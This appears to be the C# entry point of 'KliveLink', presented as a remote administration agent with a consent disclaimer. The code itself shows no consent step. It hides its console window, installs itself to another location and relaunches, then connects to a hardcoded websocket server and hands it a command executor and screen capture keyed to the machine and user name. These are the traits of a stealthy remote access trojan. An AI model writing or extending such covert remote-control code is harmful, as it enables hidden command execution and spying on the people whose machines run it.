using System.Drawing;
using System.Runtime.InteropServices;
using KliveLink.Agent;

namespace KliveLink
{
    /// <summary>
    /// KliveLink Remote Administration Agent
    /// 
    /// ETHICAL / LEGAL NOTICE:
    /// This agent is designed for LEGITIMATE remote administration only.
    /// - Explicit user consent is REQUIRED before any remote operations.
    /// - Unauthorized deployment of this software is illegal and unethical.
    /// </summary>
    internal static class Program
    {
        private const string DefaultServerUri = "ws://klive.dev:5100/klivelink";
        private static KliveLinkClient? _client;

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;

        [STAThread]
        static void Main(string[] args)
        {
            // Hide console window if one was allocated
            var consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero)
                ShowWindow(consoleWindow, SW_HIDE);

            // If not running from the embedded location, install and relaunch from there
            if (EmbedHelper.EmbedAndRelaunch(args))
                return;

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Parse arguments
            string serverUri = DefaultServerUri;
            string authToken = "";
            string agentId = Environment.MachineName + "-" + Environment.UserName;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i].ToLower())
                {
                    case "--server" when i + 1 < args.Length:
                        serverUri = args[++i];
                        break;
                    case "--token" when i + 1 < args.Length:
                        authToken = args[++i];
                        break;
                    case "--agentid" when i + 1 < args.Length:
                        agentId = args[++i];
                        break;
                }
            }

            var executor = new CommandExecutor();
            var screenCapture = new ScreenCaptureService();
            _client = new KliveLinkClient(serverUri, agentId, authToken, executor, screenCapture);

            var cts = new CancellationTokenSource();
            _ = Task.Run(() => _client.ConnectAsync(cts.Token));

            // Run the WinForms message loop (keeps the process alive)
            Application.Run();

            // Cleanup
            cts.Cancel();
            _client.Dispose();
        }
    }
}
